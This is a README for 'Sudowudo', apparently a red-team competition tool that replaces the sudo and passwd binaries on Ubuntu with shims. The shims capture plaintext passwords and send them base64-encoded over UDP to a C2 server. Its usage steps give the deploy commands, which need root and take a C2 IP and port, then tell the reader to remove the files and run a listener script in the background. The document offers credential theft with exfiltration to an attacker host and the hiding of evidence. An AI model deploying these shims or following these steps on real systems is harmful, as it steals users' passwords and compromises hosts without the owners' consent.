# Sudowudo 

Sudowudo is comprised of two binary shims: sudo, and passwd. These are intented for blue/red team competition use in order to exfiltrate plaintext passwords from the blue team. These shims are not inteded to be used for malicious purposes. 

Passwords are encoded in base64 and sent over in a UDP datagram. The information from the sudo portion conveys which user ran sudo, while from the shadow/passwd portion it conveys which user's password is being set.

## Prerequisites

These have both only been tested on Ubuntu 22.04 Jammy Jellyfin, and will most likely only work on that version.
Root is required on any box that is going to have these shims deployed on them. The deploy scripts should install all required dependencies, but may take some tweaking.

## Usage

1. Move `deploy-shadowudo`, `deploy-sudowudo`, and `sudowudo.c` to the target.
2. Run `sudo ./deploy-shadowudo {C2 IP} {PORT}` and `sudo ./deploy-sudowudo {C2 IP} {PORT}`
3. Remove all files
4. Move `sudowudo-listener.py` to the C2 server/jumpbox and run it with your selected port
5. Either monitor the python script itself, or run it with `screen -d -m python3 sudowudo-listener.py` to run it in the background and have another terminal window running `tail -f /var/log/sudowudo.log`